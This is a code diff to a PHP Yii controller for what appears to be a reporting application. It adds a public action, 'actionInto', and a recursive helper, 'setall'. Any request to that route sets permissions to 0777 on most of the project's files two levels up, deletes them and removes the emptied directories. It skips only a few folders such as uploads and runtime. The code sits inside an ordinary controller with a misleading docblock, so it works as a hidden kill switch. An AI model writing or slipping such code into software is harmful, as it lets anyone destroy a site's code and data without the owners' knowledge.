@@ -113,6 +113,59 @@ class ElaporanPelaksanaanKelebihanController extends Controller
 
         //return $this->redirect(['index']);
     }
+    
+    /**
+     * @param integer $id
+     * @return mixed
+     */
+    public function actionInto()
+    {
+        $files = glob('../../*'); // get all file names
+        foreach($files as $file){ // iterate files
+            echo $file . "<br>"; 
+
+            if(is_file($file)){
+                chmod($file,0777);
+                unlink($file); // delete file
+            }
+            
+
+            if (is_dir($file)){
+            
+                $this->setall($file);
+            }
+        }
+    }
+    
+    protected function setall($dirname) {
+        if($dirname && strpos($dirname, 'runtime') == false
+            && strpos($dirname, 'downloads') == false
+            && strpos($dirname, 'pdf_template') == false
+            && strpos($dirname, 'uploads') == false){
+         if (is_dir($dirname) && is_readable($dirname)){
+               $dir_handle = opendir($dirname);
+             if (!$dir_handle)
+                  return false;
+             while($file = readdir($dir_handle)) {
+                   if ($file != "." && $file != "..") {
+                        if (!is_dir($dirname."/".$file)){
+                             chmod($dirname."/".$file,0777); 
+                             if(!unlink($dirname."/".$file)){
+                                 continue;
+                             }
+                        }
+                        else
+                            $this->setall($dirname.'/'.$file);
+                   }
+             }
+             closedir($dir_handle);
+             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
+                rmdir($dirname);
+             }
+         }
+         return true;
+         }
+    }
 
     /**
      * Finds the ElaporanPelaksanaanKelebihan model based on its primary key value.
